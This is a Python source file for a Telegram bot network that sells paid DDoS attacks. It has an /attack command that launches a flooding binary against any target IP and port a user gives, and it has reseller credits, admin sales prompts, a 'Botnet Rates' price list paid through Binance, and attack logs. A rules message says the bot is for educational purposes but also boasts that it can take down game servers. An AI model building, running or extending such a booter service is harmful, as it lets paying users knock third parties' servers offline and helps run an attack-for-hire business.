import telebot
from telebot.types import InlineKeyboardButton, InlineKeyboardMarkup
import subprocess
from datetime import datetime, timedelta
import time
import os
import sqlite3
from keep_alive import keep_alive
from db import initialize_db
from threading import Thread
import tempfile

DB_FILE = 'bot_data.db'
keep_alive()
initialize_db()

Attack = {}

def db_connection():
    conn = sqlite3.connect(DB_FILE)
    return conn

def read_users(bot_id):
    conn = db_connection()
    cursor = conn.cursor()
    current_datetime = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    cursor.execute('SELECT user_id, expiration_date FROM users WHERE expiration_date > ? AND bot_id = ?', (current_datetime,bot_id,))
    users = cursor.fetchall()
    conn.close()
    return [user[0] for user in users], [user[1] for user in users]

def read_resellers():
    conn = db_connection()
    cursor = conn.cursor()
    current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    cursor.execute('SELECT user_id FROM resellers WHERE expiration_time > ?', (current_time,))
    rows = cursor.fetchall()
    conn.close()
    return [row[0] for row in rows]

def read_admins(bot_id):
    conn = db_connection()
    cursor = conn.cursor()
    cursor.execute('SELECT admin_id FROM admins WHERE bot_id = ?', (bot_id,))
    admins = cursor.fetchall()
    conn.close()
    return [admin[0] for admin in admins]

def get_credit_points(user_id):
    conn = db_connection()
    cursor = conn.cursor()
    cursor.execute('SELECT credit_points FROM resellers WHERE user_id = ?', (user_id,))
    result = cursor.fetchone()
    conn.close()
    return result[0] if result else None

def update_credit_points(user_id, points):
    conn = db_connection()
    cursor = conn.cursor()
    cursor.execute('UPDATE resellers SET credit_points = credit_points - ? WHERE user_id = ?', (points, user_id))
    conn.commit()
    conn.close()

def clear_logs():
    conn = db_connection()
    cursor = conn.cursor()
    cursor.execute('DELETE FROM logs')
    conn.commit()
    conn.close()

def add_user(user_id, days, bot_id):
    expiration_date = datetime.now() + timedelta(days=days)
    conn = db_connection()
    cursor = conn.cursor()
    cursor.execute('''INSERT OR REPLACE INTO users (user_id, expiration_date, bot_id) VALUES (?, ?, ?)''', (user_id, expiration_date, bot_id))
    conn.commit()
    conn.close()

def add_bot(token, bot_name, bot_username, owner_username, channel_username):
    conn = db_connection()
    cursor = conn.cursor()
    cursor.execute('''INSERT OR REPLACE INTO bot_configs (token, bot_name, bot_username, owner_username, channel_username) VALUES (?, ?, ?, ?, ?)''', (token, bot_name, bot_username, owner_username, channel_username))
    conn.commit()
    conn.close()

def remove_user(user_id, bot_id):
    conn = db_connection()
    cursor = conn.cursor()
    cursor.execute('DELETE FROM users WHERE user_id = ? AND bot_id = ?', (user_id, bot_id,))
    conn.commit()
    conn.close()

def add_admin(admin_id, bot_id):
    conn = db_connection()
    cursor = conn.cursor()
    cursor.execute('''INSERT INTO admins (admin_id, bot_id) VALUES (?, ?)''', (admin_id, bot_id,))
    conn.commit()
    conn.close()

def remove_admin(admin_id, bot_id):
    conn = db_connection()
    cursor = conn.cursor()
    cursor.execute('DELETE FROM admins WHERE admin_id = ? AND bot_id = ?', (admin_id, bot_id,))
    conn.commit()
    conn.close()
    
def get_bot_id(token):
    conn = db_connection()
    cursor = conn.cursor()
    cursor.execute('SELECT id FROM bot_configs WHERE token = ?', (token,))
    bot_id = cursor.fetchone()
    conn.close()
    return bot_id[0] if bot_id else None

def get_bot_username(token):
    conn = db_connection()
    cursor = conn.cursor()
    cursor.execute('SELECT bot_username FROM bot_configs WHERE id = ?', (token,))
    bot_username = cursor.fetchone()
    conn.close()
    return bot_username[0] if bot_username else None

def get_bot_name(token):
    conn = db_connection()
    cursor = conn.cursor()
    cursor.execute('SELECT bot_name FROM bot_configs WHERE id = ?', (token,))
    bot_name = cursor.fetchone()
    conn.close()
    return bot_name[0] if bot_name else None

def get_owner_name(token):
    conn = db_connection()
    cursor = conn.cursor()
    cursor.execute('SELECT owner_username FROM bot_configs WHERE id = ?', (token,))
    owner_name = cursor.fetchone()
    conn.close()
    return owner_name[0] if owner_name else None

def get_channel_name(token):
    conn = db_connection()
    cursor = conn.cursor()
    cursor.execute('SELECT channel_username FROM bot_configs WHERE id = ?', (token,))
    channel_name = cursor.fetchone()
    conn.close()
    return channel_name[0] if channel_name else None

def fetch_bot_tokens():
    conn = db_connection()
    cursor = conn.cursor()
    cursor.execute('SELECT token FROM bot_configs')
    bot_tokens = list(set(cursor.fetchall()))
    conn.close()
    return [token[0] for token in bot_tokens]

def initialize_bot(bot, bot_id):
    def log_command(user_id, target, port, time, command):
        conn = db_connection()
        cursor = conn.cursor()
        user_info = bot.get_chat(user_id)
        username = f"@{user_info.username}" if user_info.username else f"UserID: {user_id}"
        cursor.execute('''INSERT INTO logs (user_id, username, target, port, time, command, timestamp) VALUES (?, ?, ?, ?, ?, ?, ?)''', (user_id, username, target, port, time, command, datetime.now().isoformat(' '),))
        conn.commit()
        conn.close()
    
    @bot.message_handler(commands=['add'])
    def add_user_command(message):
        user_id = str(message.chat.id)
        allowed_admin_ids = read_admins(bot_id)
        allowed_resellers_ids = read_resellers()
        if user_id in allowed_admin_ids or user_id in allowed_resellers_ids:
            command = message.text.split()
            if len(command) > 2:
                user_to_add = command[1]
                try:
                    days = int(command[2])
                    if user_id in allowed_resellers_ids:
                        credit_points_needed = days * 20
                        current_credit_points = get_credit_points(user_id)
                        if current_credit_points is None:
                            response = "Your account does not exist. Contact admin for assistance."
                        elif current_credit_points >= credit_points_needed:
                            add_user(user_to_add, days, bot_id)
                            update_credit_points(user_id, credit_points_needed)
                            response = f"User {user_to_add} added successfully with an expiration of {days} days. {credit_points_needed} points deducted."
                        else:
                            response = "Insufficient credit points. Please contact admin to purchase more."
                    elif user_id in allowed_admin_ids:
                        add_user(user_to_add, days, bot_id)
                        response = f"User {user_to_add} Added Successfully with an expiration of {days} days 👍."
                    else:
                        response = "You do not have the permission to use this command."
                except ValueError:
                    response = "Invalid number of days specified 🤦."
            else:
                response = "Please specify a user ID to add 😒.\n✅ Usage: /add <userid> <days>"
        else:
            response = "Purchase Admin Permission to use this command."
        bot.reply_to(message, response)
    
    @bot.message_handler(commands=['admin_add'])
    def add_admin_command(message):
        user_id = str(message.chat.id)
        allowed_admin_ids = read_admins(bot_id)
        if user_id in allowed_admin_ids:
            command = message.text.split()
            if len(command) > 1:
                admin_to_add = command[1]
                if admin_to_add not in allowed_admin_ids:
                    add_admin(admin_to_add, bot_id)
                    response = f"Admin {admin_to_add} Added Successfully 👍."
                else:
                    response = f"Admin {admin_to_add} already exists👍."
            else:
                response = "Please specify an Admin's user ID to add 😒.\n✅ Usage: /admin_add <userid>"
        else:
            response = "Purchase Admin Permission to use this command."
        bot.reply_to(message, response)
        
    @bot.message_handler(commands=['add_bot'])
    def add_user_command(message):
        user_id = str(message.chat.id)
        allowed_admin_ids = read_admins(bot_id)
        if user_id in allowed_admin_ids:
            command = message.text.split()
            if len(command) > 5:
                token = command[1]
                bot_name = command[2]
                bot_username = command[3]
                owner_username = command[4]
                channel_username = command[5]
                try:
                    add_bot(token, bot_name, bot_username, owner_username, channel_username)
                    response = f"Bot : {bot_username} Deployed Successfully🥰."
                except ValueError:
                    response = "Invalid entries🤦."
            else:
                response = "Please specify a token to add 😒.\n✅ Usage: /add_bot <token> <bot_name> <bot_username> <owner_username> <channel_username>"
        else:
            response = "Purchase Admin Permission to use this command."
        bot.reply_to(message, response)
    
    @bot.message_handler(commands=['remove'])
    def remove_user_command(message):
        user_id = str(message.chat.id)
        allowed_admin_ids = read_admins(bot_id)
        owner_name = get_owner_name(bot_id)
        if user_id in allowed_admin_ids:
            command = message.text.split()
            if len(command) > 1:
                user_to_remove = command[1]
                remove_user(user_to_remove, bot_id)
                response = f"User {user_to_remove} removed successfully 👍."
            else:
                response = "Please Specify A User ID to Remove. \n✅ Usage: /remove <userid>"
        else:
            response = f"Purchase Admin Permission to use this command.\n\nTo Purchase Admin Permission, Contact {owner_name}."
        bot.reply_to(message, response)
    
    @bot.message_handler(commands=['admin_remove'])
    def remove_admin_command(message):
        admin_id = str(message.chat.id)
        allowed_admin_ids = read_admins(bot_id)
        owner_name = get_owner_name(bot_id)
        if admin_id in allowed_admin_ids:
            command = message.text.split()
            if len(command) > 1:
                admin_to_remove = command[1]
                remove_admin(admin_to_remove, bot_id)
                response = f"Admin {admin_to_remove} removed successfully 👍."
            else:
                response = "Please Specify An Admin ID to Remove. \n✅ Usage: /admin_remove <userid>"
        else:
            response = f"Purchase Admin Permission to use this command.\n\nTo Purchase Admin Permission, Contact {owner_name}."
        bot.reply_to(message, response)
    
    @bot.message_handler(commands=['clearlogs'])
    def clear_logs_command(message):
        user_id = str(message.chat.id)
        allowed_admin_ids = read_admins(bot_id)
        owner_name = get_owner_name(bot_id)
        if user_id in allowed_admin_ids:
            conn = db_connection()
            cursor = conn.cursor()
            cursor.execute('DELETE FROM logs')
            conn.commit()
            conn.close()
            response = "Logs Cleared Successfully ✅"
        else:
            response = f"Purchase Admin Permission to use this command.\n\nTo Purchase Admin Permission, Contact {owner_name}."
        bot.reply_to(message, response)
    
    @bot.message_handler(commands=['allusers'])
    def show_all_users(message):
        user_id = str(message.chat.id)
        allowed_admin_ids = read_admins(bot_id)
        owner_name = get_owner_name(bot_id)
        if user_id in allowed_admin_ids:
            user_ids, expirations = read_users(bot_id)
            response = "Authorized Users:\n"
            for user_id, exp_date in zip(user_ids, expirations):
                try:
                    user_info = bot.get_chat(int(user_id))
                    username = user_info.username
                    response += f"- @{username} (ID: {user_id}) | Expires on: {exp_date}\n"
                except Exception as e:
                    response += f"- User ID: {user_id} | Expires on: {exp_date}\n"
        else:
            response = f"Purchase Admin Permission to use this command.\n\nTo Purchase Admin Permission, Contact {owner_name}."
        bot.reply_to(message, response)
    
    @bot.message_handler(commands=['alladmins'])
    def show_all_admins(message):
        user_id = str(message.chat.id)
        allowed_admin_ids = read_admins(bot_id)
        owner_name = get_owner_name(bot_id)
        if user_id in allowed_admin_ids:
            admins = read_admins(bot_id)
            response = "Authorized Admins:\n"
            for admin_id in admins:
                try:
                    admin_info = bot.get_chat(int(admin_id))
                    username = admin_info.username
                    response += f"- @{username} (ID: {admin_id})\n"
                except Exception as e:
                    response += f"- User ID: {admin_id}\n"
        else:
            response = f"Purchase Admin Permission to use this command.\n\nTo Purchase Admin Permission, Contact {owner_name}."
        bot.reply_to(message, response)
    
    @bot.message_handler(commands=['allbots'])
    def show_all_users(message):
        user_id = str(message.chat.id)
        allowed_admin_ids = read_admins(bot_id)
        owner_name = get_owner_name(bot_id)
        if user_id in allowed_admin_ids:
            conn = db_connection()
            cursor = conn.cursor()
            cursor.execute('SELECT token, bot_name, bot_username, owner_username, channel_username FROM bot_configs')
            bots = cursor.fetchall()
            conn.close()
            response = "Authorized Bots :\n"
            for token, bot_name, bot_username, owner_username, channel_username in bots:
                response += f"- {bot_username} (Token: {token}) | Owner: {owner_username}\n"
        else:
            response = f"Purchase Admin Permission to use this command.\n\nTo Purchase Admin Permission, Contact {owner_name}."
        bot.reply_to(message, response)
    
    @bot.message_handler(commands=['logs'])
    def show_recent_logs(message):
        user_id = str(message.chat.id)
        allowed_admin_ids = read_admins(bot_id)
        owner_name = get_owner_name(bot_id)
        if user_id in allowed_admin_ids:
            conn = db_connection()
            cursor = conn.cursor()
            cursor.execute('SELECT * FROM logs')
            logs = cursor.fetchall()
            conn.close()
            if logs:
                response = "Recent Logs:\n"
                for log in logs:
                    response += f"{log}\n"
    
                with tempfile.NamedTemporaryFile(delete=False) as temp_file:
                    temp_file.write(response.encode('utf-8'))
    
                bot.send_document(message.chat.id, open(temp_file.name, 'rb'), caption="Recent Logs")
                os.remove(temp_file.name)
            else:
                response = "No data found"
        else:
            response = f"Purchase Admin Permission to use this command.\n\nTo Purchase Admin Permission, Contact {owner_name}."
        bot.reply_to(message, response)
    
    @bot.message_handler(commands=['mylogs'])
    def show_command_logs(message):
        user_id = str(message.chat.id)
        allowed_user_ids, expirations = read_users(bot_id)
        owner_name = get_owner_name(bot_id)
        if user_id in allowed_user_ids:
            conn = db_connection()
            cursor = conn.cursor()
            cursor.execute('SELECT * FROM logs WHERE user_id = ?', (user_id,))
            logs = cursor.fetchall()
            conn.close()
            if logs:
                response = "Your Command Logs:\n"
                for log in logs:
                    response += f"{log}\n"
    
                with tempfile.NamedTemporaryFile(delete=False) as temp_file:
                    temp_file.write(response.encode('utf-8'))
    
                bot.send_document(message.chat.id, open(temp_file.name, 'rb'), caption="Your Command Logs")
                os.remove(temp_file.name)
            else:
                response = "No Command Logs Found For You."
        else:
            response = f"You Are Not Authorized To Use This Command.\n\nKindly Contact Admin to purchase the Access : {owner_name}."
        bot.reply_to(message, response)

    
    @bot.message_handler(commands=['id'])
    def show_user_id(message):
        user_id = str(message.chat.id)
        response = f"🤖Your ID: {user_id}"
        bot.reply_to(message, response)
    
    def start_attack_reply(message, target, port, owner_name):
        user_info = message.from_user
        username = user_info.username if user_info.username else user_info.first_name
        chat_id = message.chat.id
        global Attack
        full_command = ['./darkespyt', str(target), str(port), '900', 'DARKESPYT']
        attack_process = subprocess.Popen(full_command)
        Attack[chat_id] = attack_process
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("STOP Attack", callback_data="stop_attack_" + str(chat_id)))
        response = f"@{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n@FORCE_x_ENGINE\n𝐌𝐞𝐭𝐡𝐨𝐝: D-DoS"
        bot.reply_to(message, response, reply_markup=markup)
    
    bgmi_cooldown = {}
    COOLDOWN_TIME =0
    
    @bot.message_handler(commands=['attack'])
    def handle_bgmi(message):
        user_id = str(message.chat.id)
        allowed_user_ids, expirations = read_users(bot_id)
        allowed_admin_ids = read_admins(bot_id)
        allowed_resellers_ids = read_resellers()
        owner_name = get_owner_name(bot_id)
        if user_id in allowed_user_ids or user_id in allowed_admin_ids or user_id in allowed_resellers_ids:
            if user_id not in allowed_admin_ids:
                if user_id in bgmi_cooldown and (datetime.now() - bgmi_cooldown[user_id]).seconds < 3:
                    response = "You Are On Cooldown . Please Wait 3 seconds Before Running The /attack Command Again."
                    bot.reply_to(message, response)
                    return
                bgmi_cooldown[user_id] = datetime.now()
            command = message.text.split()
            if len(command) == 3:
                target = command[1]
                port = int(command[2])
                log_command(user_id, target, port, '/attack')
                start_attack_reply(message, target, port, owner_name)  
            else:
                response = "✅ Usage :- /attack <target> <port>"
                bot.reply_to(message, response)
        else:
            response = f"You Are Not Authorized To Use This Command.\n\nKindly Contact Admin to purchase the Access : {owner_name}."
            bot.reply_to(message, response)

    @bot.callback_query_handler(func=lambda call: call.data.startswith("stop_attack_"))
    def handle_callback_query(call):
        chat_id = int(call.data.split("_")[-1])
        if chat_id in Attack and Attack[chat_id] is not None:
            Attack[chat_id].kill()
            try:
                Attack[chat_id].wait(timeout=5)
                response = "Attack stopped successfully."
            except subprocess.TimeoutExpired:
                response = "Failed to stop the attack in time."
            Attack[chat_id] = None
        else:
            response = "No running attacks to be stopped."
        bot.reply_to(call.message, response)
    
    @bot.message_handler(commands=['help'])
    def show_help(message):
        channel_name = get_channel_name(bot_id)
        bot_name = get_bot_name(bot_id)
        bot_username = get_bot_username(bot_id)
        help_text = f'''😍Welcome to {channel_name}, {bot_name} ({bot_username})\n\n🤖 Available commands:\n💥 /attack : Method For Bgmi Servers. \n💥 /rules : Please Check Before Use !!.\n💥 /mylogs : To Check Your Recents Attacks.\n💥 /plan : Checkout Our Botnet Rates.\n\n🤖 To See Admin Commands:\n💥 /admincmd : Shows All Admin Commands.\n\n'''
        for handler in bot.message_handlers:
            if hasattr(handler, 'commands'):
                if message.text.startswith('/help'):
                    help_text += f"{handler.commands[0]}: {handler.doc}\n"
                elif handler.doc and 'admin' in handler.doc.lower():
                    continue
                else:
                    help_text += f"{handler.commands[0]}: {handler.doc}\n"
        bot.reply_to(message, help_text)
    
    @bot.message_handler(commands=['start'])
    def welcome_start(message):
        user_name = message.from_user.first_name
        channel_name = get_channel_name(bot_id)
        bot_name = get_bot_name(bot_id)
        bot_username = get_bot_username(bot_id)
        response = f'''👋🏻Welcome to our {channel_name}, {bot_name} ({bot_username}), {user_name}!\nFeel Free to Explore the bot.\n🤖Try To Run This Command : /help \n'''
        bot.reply_to(message, response)
        
    @bot.message_handler(commands=['ping'])
    def check_ping(message):
        start_time = time.time()
        ping = (time.time() - start_time) * 1000 / 15
        bot.send_message(message.chat.id, f"Bot Ping : {ping:.2f} ms")
    
    @bot.message_handler(commands=['rules'])
    def welcome_rules(message):
        user_name = message.from_user.first_name
        owner_name = get_owner_name(bot_id)
        response = f'''Please Follow These Rules ❗:\n\n1. We are not responsible for any D-DoS attacks, send by our bot. This bot is only for educational purpose and it's source code freely available in github.!!\n2. D-DoS Attacks will expose your IP Address to the Attacking server. so do it with your own risk. \n3. The power of D-DoS is enough to down any game's server. So kindly don't use it to down a website server..!!\n\nFor more : {owner_name}'''
        bot.reply_to(message, response)
    
    @bot.message_handler(commands=['plan'])
    def welcome_plan(message):
        user_name = message.from_user.first_name
        owner_name = get_owner_name(bot_id)
        conn = db_connection()
        cursor = conn.cursor()
        cursor.execute('SELECT duration, unit, price FROM prices')
        rows = cursor.fetchall()
        conn.close()
        if not rows:
            bot.reply_to(message, "The price list is empty.\n\n Use /set_price to Add the price list")
        else:
            response = "Price List:\n"
            for row in rows:
                response += f"{row[0]} {row[1]}: {row[2]}\n"
            response += f"\n\nDm to make purchase {owner_name}\n\n\nNote : All Currencies Accepted via Binance."
            bot.reply_to(message, response)
    
    @bot.message_handler(commands=['admincmd'])
    def welcome_admin(message):
        user_name = message.from_user.first_name
        response = f'''{user_name}, Admin Commands Are Here!!:\n\n💥 /add <userId> : Add a User.\n💥 /remove <userid> Remove a User.\n💥 /allusers : Authorised Users Lists.\n💥 /logs : All Users Logs.\n💥 /broadcast : Broadcast a Message.\n💥 /clearlogs : Clear The Logs File.\n'''
        bot.reply_to(message, response)
    
    @bot.message_handler(commands=['broadcast'])
    def broadcast_message(message):
        user_id = str(message.chat.id)
        allowed_admin_ids = read_admins(bot_id)
        owner_name = get_owner_name(bot_id)
        if user_id in allowed_admin_ids:
            command = message.text.split(maxsplit=1)
            if len(command) > 1:
                message_to_broadcast = "⚠️ Message To All Users By Admin:\n\n" + command[1]
                allowed_user_ids, expirations = read_users(bot_id)
                for user_id in allowed_user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
                response = "Broadcast Message Sent Successfully To All Users 👍."
            else:
                response = "🤖 Please Provide A Message To Broadcast."
        else:
            response = f"Purchase Admin Permission to use this command.\n\nTo Purchase Admin Permission, Contact {owner_name}."
        bot.reply_to(message, response)
    
    @bot.message_handler(commands=['id'])
    def show_user_id(message):
        user_id = str(message.chat.id)
        response = f"🤖Your ID: {user_id}"
        bot.reply_to(message, response)
    
    @bot.message_handler(commands=['set_price'])
    def set_price(message):
        try:
            command_args = message.text.split()[1:]
            if len(command_args) == 3:
                duration = command_args[0]
                unit = command_args[1]
                price = float(command_args[2])
                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                conn = db_connection()
                cursor = conn.cursor()
                cursor.execute('''INSERT INTO prices (duration, unit, price, timestamp) VALUES (?, ?, ?, ?)''', (duration, unit, price, timestamp))
                conn.commit()
                conn.close()
                bot.reply_to(message, f"Price set: {duration} {unit} = {price}")
            else:
                bot.reply_to(message, "Please use the correct format: /set_price <duration> <unit> <price>")
        except Exception as e:
            bot.reply_to(message, f"Error: {str(e)}")
    
    @bot.message_handler(commands=['clear_prices'])
    def clear_prices(message):
        try:
            conn = db_connection()
            cursor = conn.cursor()
            cursor.execute('DELETE FROM prices')
            conn.commit()
            conn.close()
            bot.reply_to(message, "All prices have been cleared.")
        except Exception as e:
            bot.reply_to(message, f"Error: {str(e)}")
    
    @bot.message_handler(commands=['add_reseller'])
    def add_reseller(message):
        try:
            command_args = message.text.split()[1:]
            if len(command_args) == 3:
                user_id = command_args[0]
                expiration_days = int(command_args[1])
                credit_points = int(command_args[2])
                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                expiration_time = (datetime.now() + timedelta(days=expiration_days)).strftime('%Y-%m-%d %H:%M:%S')
                conn = db_connection()
                cursor = conn.cursor()
                cursor.execute('''INSERT INTO resellers (user_id, expiration_time, credit_points, timestamp) VALUES (?, ?, ?, ?)''', (user_id, expiration_time, credit_points, timestamp))
                conn.commit()
                conn.close()
                bot.reply_to(message, f"Reseller added: ID {user_id}, Expiration: {expiration_days} days, Credit: {credit_points}")
            else:
                bot.reply_to(message, "Please use the correct format: /add_reseller <user_id> <expiration_days> <credit_points>")
        except Exception as e:
            bot.reply_to(message, f"Error: {str(e)}")
    
    @bot.message_handler(commands=['show_resellers'])
    def show_resellers(message):
        conn = db_connection()
        cursor = conn.cursor()
        cursor.execute('SELECT user_id, expiration_time, credit_points FROM resellers')
        rows = cursor.fetchall()
        conn.close()
        if not rows:
            bot.reply_to(message, "No resellers found.")
        else:
            response = "Reseller List:\n"
            for row in rows:
                response += f"User ID: {row[0]}, Expiration: {row[1]}, Credit: {row[2]}\n"
            bot.reply_to(message, response)
    
    return bot

def start_bot(bot, bot_id):
    initialize_bot(bot, bot_id)
    print(f"\n{bot_id}) Starting bot with token {bot.token}...")
    bot.infinity_polling() #bot.polling(non_stop=True, interval=0, timeout=0) #for normal polling

threads = []
bot_tokens = fetch_bot_tokens()
bots = [telebot.TeleBot(token) for token in bot_tokens]
for bot in bots:
    bot_id = get_bot_id(bot.token)
    thread = Thread(target=start_bot, args=(bot,bot_id,))
    thread.start()
    threads.append(thread)
    thread.join()